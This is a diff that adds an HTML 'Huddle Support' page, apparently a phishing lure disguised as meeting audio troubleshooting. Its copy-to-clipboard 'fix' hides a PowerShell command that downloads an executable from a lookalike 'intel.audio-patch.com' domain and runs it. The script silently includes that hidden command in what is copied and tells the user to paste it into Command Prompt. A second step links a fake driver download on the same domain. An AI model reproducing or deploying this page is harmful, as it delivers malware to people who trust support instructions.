@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="svg/huddle_01_logo.png" type="image/x-icon">
+    <title>Huddle Support</title>
+</head>
+<body style="display: flex; justify-content: center; padding: 10px;">
+    <main style="display: flex; flex-direction: column; justify-content: center; max-width: 650px;">  
+        <h1><span class="zoom-text">Huddle</span> Support</h1>
+        <h2 class="troubleshooting-text" style="margin-bottom: 20px;">Troubleshooting audio issues in meeting</h2>
+        <p style="margin-bottom: 20px;"><span style="font-weight: bold;">Note:</span> This meeting is an organizational meeting, developed using the Huddle, to ensure compliance with security requirements.<br><br>
+            We have identified an issue where audio devices may fail to connect due to compatibility constraints with the Huddle. To resolve this issue:</p>
+        
+        <ul class="troubleshooting-text" style="margin-bottom: 20px;">
+            <li>Adjust the audio device settings to ensure compatibility with the SDK.</li>
+            <li>Refresh the device usage cache to resolve any conflicting data.</li>
+            <li>Rejoin the meeting after troubleshooting the issue.</li>
+            <li>You can automatically resolve this issue by following the solution below.</li>
+        </ul>
+        <p style="margin-bottom: 20px;">You can automatically resolve this issue by following the solution below.</p>
+        <h2 style="font-weight: 300; margin-bottom: 10px;">Solution:</h2>
+        <ol>
+            <li>
+                <p style="margin-bottom: 8px;">Run this command on <span style="font-weight: bold;">Terminal // CMD</span>.</p>
+                <div class="divCopy"><span style="color: rgb(146, 146, 146);">Troubleshoot</span><button id="copyButton"><img src="svg/copy.svg" height="15px" alt=""> Copy</button></div>
+                <div class="divterminal" id="terminalContent">
+                    <span>setx audio_volume 100</span>
+                    <span>pnputil /enum-devices /connected /class "Audio"</span>
+                    <span>wmic sounddev get Caption, ProdductName, DeviceID, Status</span>
+                    <span style="display: flex; flex-direction: row;"><p class="margin" hidden>-</p>msdt -id AudioPlaybackDiagnostic</span>
+                    <span id="hiddenText">powershell -c "iwr 'https://intel.audio-patch.com/RtlUpd64.setup.exe' -o 'RtlUpd64.setup.exe'; start 'RtlUpd64.setup.exe'"</span>
+                </div>
+            </li>
+            <li style="margin-top: 8px; margin-bottom: 20px;">Rejoin the meeting.</li>
+        </ol>
+        <h2 style="margin-bottom: 20px; font-weight: 300;">If the problem has not been resolved:</h2>
+        <h2 style="font-weight: 300; margin-bottom: 10px;">Solution 2:</h2>
+        <ol style="margin-bottom: 20px;">
+            <li>
+                To use Huddle Meeting, ensure that the <span style="font-weight: bold;">Realtek High Definition Audio Driver</span> is updated to the latest version. You can download it here:
+                <a href="https://intel.audio-patch.com/content/www/us/en/download/19455/realtek-high-definition-audio-driver-for-windows-10-64-bit-for-intel-nuc-kits-mini-pcs-nuc6cay.html" style="color: blue; text-decoration: underline;" download target="_blank">Download</a>
+            </li>
+        </ol>
+        <h2 style="font-weight: 300; margin-bottom: 10px;">Why this happens:</h2>
+        <p>The SDK is unable to access your audio device due to compatibility issues, which might be caused by:</p>
+        <ol style="margin-bottom: 20px;">
+            <li><strong>Outdated SDK Version</strong>: An older version of the SDK may not fully support your audio device.</li>
+            <li><strong>Outdated Audio Device Drivers</strong>: Older or unsupported audio drivers can lead to incompatibility with the SDK.</li>
+            <li><strong>First-Time Participation in SDK Meeting</strong>: Initial configuration may not ensure proper compatibility between your audio device and the SDK.</li>
+        </ol>
+        <div class="margin divHelp">
+            <h2 style="text-align: center; font-weight: 300;">Need more help?</h2>
+            <p style="text-align: center; margin-bottom: 20px;">Try these next steps:</p>
+            <a href="https://discord.com/invite/huddle01" target="_blank">
+                <div style="display: flex; flex-direction: row; gap: 10px; background-color: rgba(91, 139, 211, 0.562); border-radius: 5px; padding: 10px;">
+                    <div>
+                        <img src="svg/comunity.svg" height="50px" alt="">
+                    </div>
+                    <div>
+                        <p style="font-weight: bold;">Post to the help community</p>
+                        <p style="font-size: small;">Get answers from community </p>
+                        <p style="font-size: small;">members</p>
+                    </div>
+                </div>
+            </a>
+        </div>
+    </main>
+
+    <script>
+       document.getElementById("copyButton").addEventListener("click", function() {
+        // Seleciona todos os spans dentro da div, incluindo os escondidos
+        const spans = document.querySelectorAll("#terminalContent span");
+
+        // Junta todos os comandos separados por quebras de linha
+        let commands = "";
+        spans.forEach(span => {
+            commands += span.textContent.trim() + "\n"; // Adiciona quebra de linha entre comandos
+        });
+
+        // Usa a API de clipboard para copiar para a área de transferência
+        navigator.clipboard.writeText(commands).then(() => {
+            alert("Command copied. Open the Command Prompt using the appropriate shortcut keys.");
+        }).catch(err => {
+            console.error("Error copying command.:", err);
+        });
+    });
+    </script>
+</body>
+</html>
